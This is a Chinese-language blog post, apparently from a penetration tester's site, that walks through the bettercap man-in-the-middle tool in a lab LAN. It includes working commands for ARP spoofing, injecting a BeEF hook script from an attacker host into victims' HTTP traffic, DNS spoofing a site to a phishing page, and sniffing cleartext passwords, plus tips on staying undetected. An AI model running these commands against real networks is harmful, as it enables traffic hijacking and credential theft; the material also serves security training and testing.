@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="轻量高效的 MITMF [ bettercap ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>轻量高效的 MITMF [ bettercap ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/11/06/bettercap/">
+                轻量高效的 MITMF [ bettercap ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-11-06</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/bettercap/">bettercap</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>0x01 关于bettercap:<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">一款相对还不错的中间人工具,出来也有些年头了,不过貌似维护的并不是特别勤快</div><div class="line">从名字就不难看出,作者似乎是有意在向我们说明,这是一款比ettercap更好的中间人工具,<span class="string">'b'</span> <span class="keyword">is</span> better ^_^</div><div class="line">此外,工具本身基于<span class="keyword">ruby</span>,官方要求的 <span class="keyword">ruby</span>版本为 &gt;= <span class="number">1.9</span></div></pre></td></tr></table></figure></p>
+<p>0x02 基本介绍:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ubuntu</span> 16<span class="selector-class">.04</span><span class="selector-class">.3</span> <span class="selector-tag">LTS</span> 	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.12</span>    入侵者机器</div><div class="line"><span class="selector-tag">win2008r2cn</span>		<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.23</span>    模拟正常服务器,事先已准备好各种服务</div><div class="line"><span class="selector-tag">win2008cn</span>		<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.131</span>   模拟正常服务器,事先已准备好各种服务</div><div class="line"><span class="selector-tag">win2012r2cn</span>		<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.122</span>   模拟正常服务器,事先已准备好各种服务</div></pre></td></tr></table></figure></p>
+<p>0x03 首先,安装好bettercap,如果你系统的ruby版本小于1.9记得务必先升级一下,更多详情请参考其官方说明,如下<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># apt-<span class="built_in">add</span>-repository <span class="keyword">pp</span><span class="variable">a:brightbox</span>/<span class="keyword">ruby</span>-ng</div><div class="line"># apt-<span class="built_in">get</span> <span class="keyword">update</span></div><div class="line"># apt-<span class="built_in">get</span> install ruby2.<span class="number">3</span> ruby2.<span class="number">3</span>-dev</div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>安装一些必要的基础依赖库<br><figure class="highlight q"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># apt-<span class="built_in">get</span> install build-essential ruby-<span class="built_in">dev</span> libpcap-<span class="built_in">dev</span> net-tools</div></pre></td></tr></table></figure></p>
+<p>通过gem安装bettercap,安装成功后,我们就可以继续后面的内容了<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> gem install bettercap</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $?</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/bettercap_res.png" alt="&#39;&#39;"></p>
+<p>0x04 常规选项用法:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">I		指定要嗅探欺骗的网卡接口</span></div><div class="line">-<span class="ruby">-use-mac	使用自定义mac</span></div><div class="line">-<span class="ruby">-random-mac	使用随机mac</span></div><div class="line">-<span class="ruby">G		指定网关ip</span></div><div class="line">-<span class="ruby">T 		指定要嗅探的目标机器,可以是单个机器,亦可是多个机器,默认不指定会直接欺骗同内网下的所有机器[不过,实际中最好不要这样干]</span></div><div class="line">-<span class="ruby">-no-discovery	不启用主机发现模块,直接使用当前机器的arp缓存[即arp -a的内容],默认会自动启动</span></div><div class="line">-<span class="ruby">O		将流过的所有数据都记录到指定的文件中,在实战中建议指定该选项,便于后续下载到本地仔细分析</span></div></pre></td></tr></table></figure></p>
+<p>0x05 主要功能选项[欺骗及嗅探器]:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">S  启用欺骗功能,默认就会开启,且默认使用的是ARP欺骗,你也可以用更偏上层协议,如,ICMP,HSRP...</span></div><div class="line">-<span class="ruby">X  启用嗅探器,注意,光启用spoofer单单只是让其它机器的流量经过自己,而嗅探器则是用来抓取这些流量中的密码</span></div><div class="line">-<span class="ruby">P  抓取指定类型的数据,主要是针对各类明文密码及访问记录,如,FTP,POST,MYSQL...默认会抓取所有类型,为了利于后期分析,建议指定类型</span></div></pre></td></tr></table></figure></p>
+<p>0x06 使用各种协议的透明代理功能,我们可以拿它来观察目标机器的访问记录,甚至可以直接往里注入恶意流量,注意,当http代理功能开启后,ssltrip也会自动开启:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">-proxy	 启用http代理,这个也可能是最常用的,除了http,它也支持https,tcp,udp及自定义代理流量</span></div><div class="line">-<span class="ruby">-proxy-<span class="class"><span class="keyword">module</span> <span class="title">injecthtml</span>,<span class="title">injectjs</span>,<span class="title">redirect</span>,<span class="title">injectcss</span>	往来回的<span class="title">http</span>流量中注入恶意数据</span></span></div></pre></td></tr></table></figure></p>
+<p>如,在来往的的http流量中注入恶意js,主动让同内网下的所有浏览器上线,这里只是为了简单演示效果,才用的beef,实际中可以换成更好一点的xss平台,从上面选项中我们看到,除了注入js,html,css都是支持的<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># bettercap -I ens33 -S ARP --proxy --proxy-module injectjs --js-url <span class="string">"http://*.3.10:3000/hook.js"</span> -G <span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span> -T <span class="number">192.168</span><span class="number">.3</span><span class="number">.120</span><span class="number">-135</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/bettercap_injection.png" alt="&#39;&#39;"><br><img src="/img/bettercap_injection_res.png" alt="&#39;&#39;"></p>
+<p>0x07 利用<code>http server</code>和<code>--dns</code>功能,进行dns欺骗进行钓鱼,这里有个不好的地方,就是dns缓存会在目标机器上持续很久,必须手工刷新缓存才行,而且被劫持以后,当用户访问别的域名有时是访问不了的,另外,bettercap似乎并不依靠系统内核进行转发,挺好</p>
+<p>编辑dns解析文件,意思就是将所有访问freebuf.com的流量都重定向到本地的web服务器上<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi dns.txt</span></div><div class="line">  <span class="keyword">local</span> .*freebuf\.com</div></pre></td></tr></table></figure></p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#</span> <span class="comment">bettercap</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">httpd</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">httpd</span><span class="literal">-</span><span class="comment">port</span> <span class="comment">80</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">httpd</span><span class="literal">-</span><span class="comment">path=/root/hacked</span><span class="string">.</span><span class="comment">html</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">dns</span> <span class="comment">dns</span><span class="string">.</span><span class="comment">conf</span></div><div class="line"><span class="comment">#</span> <span class="comment">ipconfig</span> <span class="comment">/flushdns	污染完了以后</span><span class="string">,</span><span class="comment">记得顺手把dns缓存清一下</span></div></pre></td></tr></table></figure>
+<p><img src="/img/bettercap_dns.png" alt="&#39;&#39;"><br><img src="/img/bettercap_dns_res.png" alt="&#39;&#39;"></p>
+<p>0x08 其它的一些常规用法</p>
+<p>尝试抓取http POST数据中的各类明文密码:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># <span class="selector-tag">bettercap</span> <span class="selector-tag">-I</span> <span class="selector-tag">ens33</span> <span class="selector-tag">-S</span> <span class="selector-tag">ARP</span> <span class="selector-tag">-X</span> <span class="selector-tag">-P</span> <span class="selector-tag">POST</span> <span class="selector-tag">-G</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.1</span> <span class="selector-tag">-T</span> 192<span class="selector-class">.168</span><span class="selector-class">.3</span><span class="selector-class">.131</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/bettercap_http.png" alt="&#39;&#39;"><br><img src="/img/bettercap_http_admin.png" alt="&#39;&#39;"><br><img src="/img/bettercap_http_res.png" alt="&#39;&#39;"></p>
+<p>抓各类服务明文及hash,这里只是随便演示几个,支持的服务和工具比较多,不过用法都非常简单,大家可执行查看其帮助:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># bettercap -I ens33 -S ARP -X -P <span class="string">"MAIL,FTP,MYSQL"</span> -G <span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span> -T <span class="number">192.168</span><span class="number">.3</span><span class="number">.120</span><span class="number">-135</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/bettercap_pass_ftp.png" alt="&#39;&#39;"><br><img src="/img/bettercap_pass_mysql.png" alt="&#39;&#39;"></p>
+<p><br><br>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;工具基本属于全程傻瓜化的那种,虽然,目前还有些小瑕疵,不过用用还是可以的,在实战中可能最多就是用它来抓抓密码,自己实战中也用过几次,说实话,效果并没想象的那么好,其它的那些花哨功能,在实战也并不太建议用,内网毕竟不像web,稍有不慎,极易被发现,权限万一丢了,再想拿回来就费劲了,一切还以稳定为主,另外,工具比较轻量[起码自己感觉确实比ettercap温柔多了,暂时还没出现过把对方搞掉的情况],程序结构化非常分明,用什么开什么即可,避免动静过大,有些功能可能会默认开,如<code>spoofer 功能</code>,如果没必要用它,直接<code>-S NONE</code>即可,废话不多讲,大家还是自行在实战中多多体会吧,另外,由于篇幅原因,没法每一项都介绍的非常详细,官方已经为我们提供了非常详细的使用说明,英文还可以的朋友,可以直接去读一手文档,相信只要不是英文烂到没朋友的那种,基本都能轻松看懂,其实,自己很多也都是参考其官方文档来的,最后,如果目标是Ubuntu14.04以上的系统还是非常值得尝试的,否则这个ruby环境在其它系统中搞起来可能会比较麻烦,祝好运 ^_^</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/MITMF/">#MITMF</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
